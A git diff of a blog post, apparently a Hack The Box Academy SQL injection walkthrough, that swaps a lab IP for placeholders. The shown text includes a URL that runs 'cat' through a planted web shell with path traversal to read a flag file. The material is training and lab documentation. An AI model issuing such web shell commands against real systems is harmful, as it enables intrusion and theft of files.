@@ -3,7 +3,7 @@ layout: post
 title:  "Hack The Box - Academy - SQL Injection Fundamentals"
 date:   2024-10-03 20:25
 image:  /images/htb/sql-injection/logo.png
-tags:   [sqli]
+tags:   [sqli,cbbh]
 categories: [htbacademy]
 ---
 
@@ -93,8 +93,9 @@ This command list all files in the directory, confirming that the web shell is w
 #### 9. Retrieving the Flag
 Enumerate the directories to locate the flag. Once found, use the cat command to display its contents:
 ```
-http://83.136.251.168:46575/dashboard/shell.php?0=cat%20../../../../flag_cae1dadcd174.txt
+http://{TARGET_IP}:{TARGET_PORT}/dashboard/shell.php?0=cat%20../../../../flag_cae1dadcd174.txt
 ```
 ![Flag result](/images/htb/sql-injection/flag_result.png)
+<br/>
 Submit the contents of the flag as the answer to complete the challenge.
 <hr/>
